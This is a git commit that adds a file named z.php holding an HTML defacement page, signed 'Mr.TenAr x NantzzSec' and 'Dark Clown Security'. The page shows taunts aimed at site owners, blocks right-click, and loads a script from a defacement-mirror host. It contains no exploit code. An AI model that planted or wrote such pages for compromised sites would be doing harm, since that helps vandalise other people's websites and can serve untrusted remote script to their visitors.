fd41b9fb0a26c0576f49d5d25cad87402f0f5d56
Tengku Arya Saputra <33353823+AryaSec1337@users.noreply.github.com>
2025-04-18 07:09:04 +0700

    Create z.php

---
+++ z.php
@@ -0,0 +1,66 @@
+
+<html>
+
+<head>
+	<title>Pwnd by Mr.TenAr</title>
+	<link rel="icon" type="image/png" href="https://c.top4top.io/p_20661mc0d0.png">
+	<meta property="og:image" content="https://c.top4top.io/p_20661mc0d0.pngg" />
+	<meta name="description" content="<3">
+	<meta charset="utf-8">
+	<style>
+		html,
+		body {
+			color: white;
+			font-family: 'Fredericka the Great', sans-serif;
+			font-weight: 100;
+			height: 100vh;
+			margin: 0
+		}
+
+		.full-height {
+			height: 100vh
+		}
+
+		.flex-center {
+			align-items: center;
+			display: flex;
+			justify-content: center
+		}
+
+		.position-ref {
+			position: relative
+		}
+
+		.content {
+			text-align: center
+		}
+
+		.title {
+			font-size: 36px;
+			padding: 20px
+		}
+	</style>
+</head>
+<style type='text/css'>
+	body,
+	a:hover {
+		cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;
+	}
+</style>
+
+<body align="center" oncontextmenu="return false" bgcolor="black">
+	<div class="stars">
+		<div class="twinkling">
+			<div class="flex-center position-ref full-height">
+				<div class="content">
+					<div class="text">
+						<font color="#00000">
+							<img src="https://c.top4top.io/p_20661mc0d0.png" width="450px" heigt="450px">
+							<br> <br>
+							<font size="5" style="color: white;">
+								<b><i><code>&hearts; Pwn3dz By Mr.TenAr x NantzzSec &hearts; </font>
+		 	 				 <br><br><h2 style="color: white;">~ I'm back to test how big your security force is, you can't stop me. ~<h2><br>
+                                <h2 style="color: white;">~ We Are Dark Clown Security ~<h2><br>
+			<script type="text/javascript" src="http://zonehmirrors.org/defaced/2020/06/23/ardma.midanuttalim.com/suhunan.sukabumikab.go.id/sakura.js"></script>
+		 	 				</body>
+		 	 				 </html>
